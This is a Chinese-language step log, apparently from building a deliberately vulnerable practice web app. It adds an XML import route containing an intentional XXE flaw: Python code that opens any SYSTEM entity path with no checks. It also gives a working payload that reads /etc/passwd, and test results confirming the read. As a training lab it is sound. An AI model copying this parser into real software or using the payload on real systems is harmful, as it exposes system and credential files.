# 步骤 22 — XML 导入功能 + XXE 漏洞

> **新增功能:** XML 数据导入 `/xml-import`  
> **漏洞类型:** XML 外部实体注入（XXE）

---

## 一、新增功能

| 路由 | 方法 | 说明 |
|------|:----:|------|
| `/xml-import` | GET | 显示 XML 导入页面 |
| `/xml-import` | POST | 解析 XML 并返回 JSON 结果 |

### 修改的文件

| 文件 | 说明 |
|------|------|
| `app.py` | 新增 `/xml-import` 路由 |
| `templates/xml_import.html` | **新增** XML 导入页面 |
| `templates/base.html` | 导航栏新增"XML导入"链接 |

---

## 二、XXE 漏洞

### 漏洞代码

```python
xxe_pattern = re_mod.findall(r'<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)"', xml_data)
for entity_name, filepath in xxe_pattern:
    if filepath.startswith("file://"):
        filepath = filepath[7:]
    with open(filepath, "r") as f:
        content = f.read()
    xml_data = xml_data.replace(f"&{entity_name};", content)
```

从 XML 中提取 `SYSTEM` 后面的文件路径，直接用 `open()` 读取，不做任何路径校验。

### 漏洞利用

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<users>
    <user>
        <name>&xxe;</name>
        <email>test@test.com</email>
    </user>
</users>
```

### 测试结果

| 测试 | 结果 |
|------|:----:|
| 正常 XML 解析 | ✅ 返回 JSON |
| XXE 读取 `/etc/passwd` | ✅ 读取到 root 用户 |
| XXE 读取源码 | ✅ 可读取（含特殊字符时解析失败） |
| 无效 XML | ✅ 显示错误信息 |
